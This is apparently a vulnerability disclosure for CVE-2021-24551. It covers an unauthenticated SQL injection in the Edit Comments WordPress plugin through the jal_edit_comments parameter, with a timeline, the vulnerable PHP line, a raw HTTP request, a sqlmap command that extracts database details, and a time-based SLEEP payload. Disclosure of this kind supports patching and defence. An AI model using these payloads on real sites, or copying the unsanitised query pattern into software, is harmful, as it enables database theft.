<center><a href=""><span class="title">Wp Plugin Edit Comments</span></a></center>

<h3><u>Plugin Details</u></h3><div>Plugin Name: <a href="https://wordpress.org/plugins/edit-comments/" rel="noreferrer noopener nofollow" target="_blank">wp-plugin : edit-comments</a></div>
<div>Effected Version : 0.3 (and most probably lower version's if any)</div>
<div>Vulnerability : <a href="/category/injection/">Injection</a></div>
<div>Minimum Level of Access Required : Unauthenticated</div>
<div>CVE Number : CVE-2021-24551</div>
<div>Identified by : <a href="/author/shreya_pohekar/">Shreya Pohekar</a></div>
<div><a href="https://wpscan.com/plugin/edit-comments/" rel="noreferrer noopener nofollow" target="_blank">WPScan Reference URL</a></div>
 
<h3><u>Disclosure Timeline</u></h3>
<ul>
	<li>

<div>June 1, 2021: Issue Identified and Disclosed to WPScan</div>

	</li>
	
	<li>
	June 2, 2021 : Plugin  Closed</li>
	
	
	<li>July 20, 2021 : CVE Assigned</li>
	
	<li>July 23, 2021 : Public Disclosure</li>
</ul>



<h3><u>Technical Details</u></h3>

<p>The edit comment functionality, available to unauthenticated users takes in GET parameter <code>jal_edit_comments</code> and inserts it into the SQL statement without proper sanitization, escaping or validation therefore leaading to unauthenticated SQLI.</p>
<p>Vulnerable_code: <a href="https://plugins.trac.wordpress.org/browser/edit-comments/trunk/jal-edit-comments.php#L52" target="_blank" rel="noreferrer noopener nofollow">jal-edit-comments.php#L52</a>
</p>
<pre><code>52:             $jal_comment = $wpdb-&gt;get_row(&quot;SELECT comment_content, comment_author_IP, comment_date_gmt FROM $wpdb-&gt;comments WHERE comment_ID = &quot;.$_GET['jal_edit_comments']);
</code></pre><h4 id="poc-screenshot">PoC Screenshot</h4>
<p><img src="/disclosure_screenshots/edit-comments-poc.png" alt="PoC Screenshot"></p>
<h4 id="exploit">Exploit</h4>
<pre><code>GET /2021/03/02/hello-world/?jal_edit_comments=4 HTTP/1.1
Host: 172.28.128.50
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://172.28.128.50/2021/03/02/hello-world/
Accept-Language: en-US,en;q=0.9
Connection: close

</code></pre><h4 id="sqlmap-command">SQLmap command</h4>
<pre><code>sqlmap -r edit-comments.req --dbms mysql --current-user --current-db -b -p jal_edit_comments --batch

</code></pre><h4 id="steps-to-reproduce">Steps to reproduce</h4>
<ol>
<li>Download and activate the plugin.</li>
<li>With the plugin you get a code for comments.php. Replace you theme&rsquo;s comment.php with the one obtained with the plugin. This will also change the look and feel of the comment section.</li>
<li>Now comment with any user.</li>
<li>Click the <code>e</code> button that comes alongside the posted comment. That helps you to edit the comment.</li>
<li>Paste this payload: http://<!-- raw HTML omitted -->/2021/03/02/hello-world.html?jal_edit_comments=7%20AND%20(SELECT%209114%20FROM%20(SELECT(SLEEP(5)))wjzD)</li>
<li>You will experience a delay of 5 sec before the page is loaded and hence confirms the vulnerability.</li>
</ol>


